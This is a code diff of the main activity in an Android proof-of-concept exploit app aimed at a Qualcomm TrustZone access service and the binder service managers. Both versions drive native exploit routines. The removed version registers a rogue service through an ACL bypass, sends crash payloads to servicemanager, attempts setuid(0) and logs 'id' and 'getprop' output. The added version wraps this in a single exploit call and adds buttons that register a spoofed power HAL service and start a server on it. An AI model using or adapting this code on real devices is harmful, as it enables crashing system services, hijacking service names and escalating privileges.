@@ -1,5 +1,6 @@
 package com.example.tzpoc;
 
+import android.Manifest;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
@@ -17,9 +18,11 @@ import android.widget.Button;
 import android.widget.ScrollView;
 import android.widget.TextView;
 import android.widget.Toast;
+
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import androidx.core.content.FileProvider;
 
 import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;
 
@@ -40,7 +43,7 @@ public class MainActivity extends AppCompatActivity {
     private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
 
     private TextView tvStatus, tvLog;
-    private Button btnStart, btnStop;
+    private Button btnStart, btnStop, btnAddOnly, btnStartServer;
     private Handler handler = new Handler(Looper.getMainLooper());
     private StringBuilder logBuilder = new StringBuilder();
     private IMinkSocketFd tzService;
@@ -48,40 +51,17 @@ public class MainActivity extends AppCompatActivity {
     private AtomicBoolean isTesting = new AtomicBoolean(false);
     private AtomicBoolean stopRequested = new AtomicBoolean(false);
     private Thread testThread;
+    private int lastHandle = -1;
 
     static {
         System.loadLibrary("pocjni");
     }
 
-    public static native String[] nativeListDir(String path);
-    public static native String nativeReadFile(String path);
-    public static native String nativeWriteFile(String path, String content);
-    public static native String nativeReadLink(String path);
-    public static native String nativeTestFd(int fd);
-    public static native int nativeOpenDevice(String path);
-    public static native String nativeGetKernelInfo();
-    public static native String nativeBinderGetVersion(int fd);
-    public static native String nativeBinderIoctlTest(int fd, int cmd, long arg);
-    public static native String nativeBinderSendTransaction(int fd, int handle, int code, int flags);
-
-    public static native int nativeGetServicemanagerPid();
-    public static native int nativeWaitServicemanagerRestart(int oldPid, int timeoutSec);
-    public static native int nativeSendMalformedGetService(int fd, String name);
-    public static native int nativeSendHugeNameAddService(int fd, String name);
-    public static native int nativeSendInvalidOffsets(int fd);
-    public static native int nativeSendNullBuffer(int fd);
-    public static native int nativeSendIntegerOverflowGetService(int fd);
-    public static native int nativeAddService(int fd, String name);
-    public static native int nativeGetService(int fd, String name);
-    public static native int nativeSetUid(int uid);
-    public static native int nativeSetResUid(int uid);
-    public static native String nativeExecCommand(String cmd);
-    public static native int nativeForkExec(String cmd);
-    public static native String nativeRunHwPayloadsOnServiceManager(int fd);
-
-    public static native int nativeHwAddService(int fd, String name);
-    public static native int nativeHwGetService(int fd, String name);
-    public static native String nativeHwRunPayloads(int fd);
+    // JNIネイティブメソッド
+    public static native int nativeGetHwServicemanagerPid();
+    public static native int nativeExploit(String outputPath, String logPath);
+    public static native int nativeAddServiceOnly(String serviceName);
+    public static native int nativeStartServer(int handle);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -92,7 +72,7 @@ public class MainActivity extends AppCompatActivity {
                 updateStatus("Bound - starting exploit");
                 enableButtons(false, true);
                 stopRequested.set(false);
-                testThread = new Thread(() -> executeExploit());
+                testThread = new Thread(() -> executeFullExploit());
                 testThread.start();
             } else {
                 appendLog("[TZ] Failed to cast to IMinkSocketFd");
@@ -113,10 +93,13 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
         tvStatus = findViewById(R.id.tv_status);
         tvLog = findViewById(R.id.tv_log);
         btnStart = findViewById(R.id.btn_start);
         btnStop = findViewById(R.id.btn_stop);
+        btnAddOnly = findViewById(R.id.btn_add_only);
+        btnStartServer = findViewById(R.id.btn_start_server);
 
         requestPermissions();
 
@@ -128,6 +111,7 @@ public class MainActivity extends AppCompatActivity {
                 bindService();
             }
         });
+
         btnStop.setOnClickListener(v -> {
             if (isTesting.get()) {
                 stopRequested.set(true);
@@ -140,13 +124,49 @@ public class MainActivity extends AppCompatActivity {
                 isTesting.set(false);
             }
         });
-        appendLog("App started. Press 'Start' to begin.");
+
+        btnAddOnly.setOnClickListener(v -> {
+            if (lastHandle < 0) {
+                String name = "android.hardware.power.IPower";
+                int handle = nativeAddServiceOnly(name);
+                if (handle >= 0) {
+                    lastHandle = handle;
+                    appendLog("[+] ADD_SERVICE succeeded! handle=" + handle);
+                    Toast.makeText(this, "Service added: handle=" + handle, Toast.LENGTH_SHORT).show();
+                } else {
+                    appendLog("[-] ADD_SERVICE failed: " + handle);
+                    Toast.makeText(this, "ADD_SERVICE failed", Toast.LENGTH_SHORT).show();
+                }
+            } else {
+                appendLog("[*] Service already registered. handle=" + lastHandle);
+            }
+        });
+
+        btnStartServer.setOnClickListener(v -> {
+            if (lastHandle >= 0) {
+                int pid = nativeStartServer(lastHandle);
+                if (pid >= 0) {
+                    appendLog("[+] Server started. PID=" + pid);
+                    Toast.makeText(this, "Server PID=" + pid, Toast.LENGTH_SHORT).show();
+                } else {
+                    appendLog("[-] Server start failed");
+                    Toast.makeText(this, "Server start failed", Toast.LENGTH_SHORT).show();
+                }
+            } else {
+                appendLog("[-] Please add a service first");
+                Toast.makeText(this, "Add a service first", Toast.LENGTH_SHORT).show();
+            }
+        });
+
+        appendLog("App started.");
+        appendLog("Press 'Start Full Exploit' for automatic attack.");
+        appendLog("Or use 'Add Service' + 'Start Server' manually.");
     }
 
     private void requestPermissions() {
         String[] perms = {
-                android.Manifest.permission.READ_EXTERNAL_STORAGE,
-                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE
         };
         List<String> toRequest = new ArrayList<>();
         for (String p : perms) {
@@ -189,95 +209,31 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    private void executeExploit() {
+    private void executeFullExploit() {
         appendLog("========================================");
-        appendLog("===== hwservicemanager ACL Bypass + servicemanager restart POC =====");
+        appendLog("===== Full Exploit Starting =====");
 
-        appendLog("[*] Gathering kernel info");
-        String kernelInfo = nativeGetKernelInfo();
-        appendLog(kernelInfo);
+        int pid = nativeGetHwServicemanagerPid();
+        appendLog("[*] hwservicemanager PID: " + pid);
 
-        appendLog("[*] STEP 1: Open /dev/hwbinder");
-        int hwFd = nativeOpenDevice("/dev/hwbinder");
-        if (hwFd < 0) {
-            appendLog("[-] Failed to open /dev/hwbinder: " + hwFd);
-            finishTest();
-            return;
-        }
-        appendLog("[+] /dev/hwbinder opened fd=" + hwFd);
+        String outputPath = getDumpDir() + "/cve_result.txt";
+        String logPath = getDumpDir() + "/binder_traffic.log";
+        appendLog("[*] Output: " + outputPath);
+        appendLog("[*] Log: " + logPath);
 
-        String hwVersion = nativeBinderGetVersion(hwFd);
-        appendLog("[*] hwbinder version: " + hwVersion);
+        int result = nativeExploit(outputPath, logPath);
+        appendLog("[*] Exploit result: " + (result == 1 ? "SUCCESS" : "FAILED"));
 
-        String serviceName = "android.hardware.poc.IPoCService";
-        appendLog("[*] STEP 2: Add service '" + serviceName + "' via ACL Bypass (hwservicemanager)");
-        int addRet = nativeHwAddService(hwFd, serviceName);
-        appendLog("  ADD_SERVICE result: " + addRet);
-
-        if (addRet == 0) {
-            appendLog("[+] Service added successfully to hwservicemanager!");
-            int getRet = nativeHwGetService(hwFd, serviceName);
-            appendLog("  GET_SERVICE result: " + getRet);
-        } else {
-            appendLog("[-] Failed to add service. ACL Bypass might not work.");
-        }
-        closeFd(hwFd);
-
-        appendLog("[*] STEP 3: Now crash servicemanager using hwservicemanager-style payloads");
-        int binderFd = nativeOpenDevice("/dev/binder");
-        if (binderFd < 0) {
-            appendLog("[-] Failed to open /dev/binder: " + binderFd);
-            finishTest();
-            return;
-        }
-        appendLog("[+] /dev/binder opened fd=" + binderFd);
-
-        int oldPid = nativeGetServicemanagerPid();
-        appendLog("[*] Current servicemanager PID: " + oldPid);
-
-        appendLog("[*] Sending crash payloads to servicemanager...");
-        String crashResult = nativeRunHwPayloadsOnServiceManager(binderFd);
-        appendLog(crashResult);
-
-        appendLog("[*] Waiting for servicemanager to restart (max 15s)");
-        int newPid = nativeWaitServicemanagerRestart(oldPid, 15);
-        if (newPid > 0) {
-            appendLog("[+] servicemanager restarted with PID " + newPid);
-            appendLog("[*] STEP 4: Check if hwservicemanager service is now used by system_server?");
-            appendLog("[*] Re-opening /dev/hwbinder to verify the service still exists");
-            int hwFd2 = nativeOpenDevice("/dev/hwbinder");
-            if (hwFd2 >= 0) {
-                int checkRet = nativeHwGetService(hwFd2, serviceName);
-                appendLog("  GET_SERVICE after restart: " + checkRet);
-                closeFd(hwFd2);
-                if (checkRet == 0) {
-                    appendLog("[+] Service still present in hwservicemanager!");
-                    appendLog("[*] Attempting to setuid(0) (privilege escalation)");
-                    int uidRet = nativeSetUid(0);
-                    appendLog("  setuid(0) -> " + uidRet);
-                    if (uidRet != 0) {
-                        int resRet = nativeSetResUid(0);
-                        appendLog("  setresuid(0,0,0) -> " + resRet);
-                    }
-                    String idOut = nativeExecCommand("id");
-                    appendLog("  id output: " + idOut);
-                    nativeForkExec("echo 'ACL Bypass + restart exploit succeeded' > /sdcard/Download/exploit_success.txt");
-                    nativeForkExec("id >> /sdcard/Download/exploit_success.txt");
-                    nativeForkExec("getprop >> /sdcard/Download/exploit_success.txt");
-                    appendLog("[*] Check /sdcard/Download/exploit_success.txt");
-                } else {
-                    appendLog("[-] Service disappeared or not accessible.");
-                }
-            } else {
-                appendLog("[-] Could not re-open /dev/hwbinder");
+        if (result == 1) {
+            appendLog("[+] Check " + outputPath + " for results");
+            String content = readFile(outputPath);
+            if (content != null) {
+                appendLog("[CONTENT]\n" + content);
             }
-        } else {
-            appendLog("[-] servicemanager did not restart within timeout.");
         }
 
-        closeFd(binderFd);
         appendLog("========================================");
-        appendLog("===== Exploit finished =====");
+        appendLog("===== Exploit Finished =====");
         updateStatus("Done");
         isTesting.set(false);
         enableButtons(true, false);
@@ -285,14 +241,26 @@ public class MainActivity extends AppCompatActivity {
         finishTest();
     }
 
-    private void sleep(int ms) {
-        try { Thread.sleep(ms); } catch (Exception ignored) {}
+    private String readFile(String path) {
+        try {
+            java.io.FileInputStream fis = new java.io.FileInputStream(path);
+            byte[] buf = new byte[8192];
+            int n = fis.read(buf);
+            fis.close();
+            if (n > 0) return new String(buf, 0, n, StandardCharsets.UTF_8);
+        } catch (Exception e) {
+            appendLog("Read error: " + e.getMessage());
+        }
+        return null;
     }
 
-    private void closeFd(int fd) {
-        if (fd >= 0) {
-            try { ParcelFileDescriptor.adoptFd(fd).close(); } catch (Exception ignored) {}
+    private String getDumpDir() {
+        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
+            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+            if (dir != null && (dir.exists() || dir.mkdirs())) return dir.getAbsolutePath();
         }
+        File dir = getFilesDir();
+        return dir.getAbsolutePath();
     }
 
     private void appendLog(final String msg) {
@@ -312,12 +280,12 @@ public class MainActivity extends AppCompatActivity {
 
     private void saveLog() {
         try {
-            File dir = getDumpDir();
-            File file = new File(dir, "hw_servicemanager_exploit_log.txt");
-            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
-                pw.println("=== hwservicemanager + servicemanager Exploit Log ===");
+            File file = new File(getDumpDir(), "exploit_log.txt");
+            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(
+                    new FileOutputStream(file), StandardCharsets.UTF_8))) {
+                pw.println("=== Exploit Log ===");
                 pw.println("Timestamp: " + new Date().toString());
-                pw.println("=====================================================");
+                pw.println("====================");
                 pw.print(logBuilder.toString());
                 pw.flush();
             }
@@ -325,14 +293,6 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {
             appendLog("Save failed: " + e.getMessage());
         }
-    }
-
-    private File getDumpDir() {
-        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
-            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-            if (dir != null && (dir.exists() || dir.mkdirs())) return dir;
-        }
-        return getFilesDir();
     }
 
     private void finishTest() {
